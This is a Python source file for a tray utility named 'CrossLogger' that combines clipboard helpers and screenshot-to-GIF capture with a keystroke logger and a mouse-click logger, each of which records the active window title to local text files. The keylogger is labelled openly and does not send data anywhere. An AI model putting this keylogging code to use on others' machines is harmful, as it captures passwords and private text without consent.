#!/usr/bin/env python3
import time
import pyperclip
import pystray
from PIL import Image, ImageDraw, ImageGrab
from threading import Thread
from pynput import keyboard, mouse
import platform
import sys

# =========================
# Active window (cross-platform)
# =========================
if sys.platform.startswith("win"):
    import win32gui

    def get_active_window():
        try:
            hwnd = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(hwnd) or "Unknown"
        except:
            return "Unknown"

elif sys.platform.startswith("linux"):
    from Xlib import display, X

    def get_active_window():
        try:
            d = display.Display()
            root = d.screen().root
            NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
            NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
            window_id = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType).value[0]
            window = d.create_resource_object('window', window_id)
            window_name = window.get_full_property(NET_WM_NAME, 0)
            if window_name:
                return window_name.value.decode('utf-8')
            return "Unknown"
        except:
            return "Unknown"

else:
    def get_active_window():
        return "Unsupported OS"

# =========================
# Clipboard functions
# =========================
def clean_formatting():
    pyperclip.copy(pyperclip.paste())

def clear_clipboard():
    pyperclip.copy("")

def uppercase_clipboard():
    pyperclip.copy(pyperclip.paste().upper())

def lowercase_clipboard():
    pyperclip.copy(pyperclip.paste().lower())

# =========================
# Screenshots → GIF
# =========================
frames = []

def capture_screen():
    try:
        frames.append(ImageGrab.grab())
        print("Screenshot captured")
    except Exception as e:
        print("Screenshot error:", e)

def save_gif():
    if not frames:
        return
    name = f"screens_{int(time.time())}.gif"
    frames[0].save(name, save_all=True, append_images=frames[1:], duration=500, loop=0)
    frames.clear()
    print("GIF saved:", name)

# =========================
# Keylogger
# =========================
key_log = "key_log.txt"
key_listener = None

def on_key_press(key):
    with open(key_log, "a", encoding="utf-8") as f:
        f.write(f"{time.ctime()} | {key} | {get_active_window()}\n")

def start_keylogger():
    global key_listener
    if not key_listener:
        key_listener = keyboard.Listener(on_press=on_key_press)
        key_listener.start()
        print("Keylogger started")

def stop_keylogger():
    global key_listener
    if key_listener:
        key_listener.stop()
        key_listener = None
        print("Keylogger stopped")

# =========================
# Mouse logger
# =========================
mouse_log = "mouse_log.txt"
mouse_listener = None

def on_click(x, y, button, pressed):
    if pressed:
        with open(mouse_log, "a", encoding="utf-8") as f:
            f.write(f"{time.ctime()} | {button} | ({x},{y}) | {get_active_window()}\n")

def start_mouse_logger():
    global mouse_listener
    if not mouse_listener:
        mouse_listener = mouse.Listener(on_click=on_click)
        mouse_listener.start()
        print("Mouse logger started")

def stop_mouse_logger():
    global mouse_listener
    if mouse_listener:
        mouse_listener.stop()
        mouse_listener = None
        print("Mouse logger stopped")

# =========================
# System tray icon
# =========================
def tray_icon():
    img = Image.new("RGB", (64, 64), "black")
    d = ImageDraw.Draw(img)
    d.text((10, 20), "LOG", fill="white")
    return img

def quit_app(icon, item):
    stop_keylogger()
    stop_mouse_logger()
    icon.stop()

icon = pystray.Icon(
    "CrossLogger",
    tray_icon(),
    f"CrossLogger ({platform.system()})",
    menu=pystray.Menu(
        pystray.MenuItem("Clean clipboard", lambda _: clean_formatting()),
        pystray.MenuItem("Clear clipboard", lambda _: clear_clipboard()),
        pystray.MenuItem("Uppercase", lambda _: uppercase_clipboard()),
        pystray.MenuItem("Lowercase", lambda _: lowercase_clipboard()),
        pystray.MenuItem("Capture screen", lambda _: capture_screen()),
        pystray.MenuItem("Save GIF", lambda _: save_gif()),
        pystray.MenuItem("Start keylogger", lambda _: start_keylogger()),
        pystray.MenuItem("Stop keylogger", lambda _: stop_keylogger()),
        pystray.MenuItem("Start mouse logger", lambda _: start_mouse_logger()),
        pystray.MenuItem("Stop mouse logger", lambda _: stop_mouse_logger()),
        pystray.MenuItem("Quit", quit_app)
    )
)

# =========================
# Run tray in background
# =========================
Thread(target=icon.run, daemon=True).start()

# Keep script alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    quit_app(icon, None)
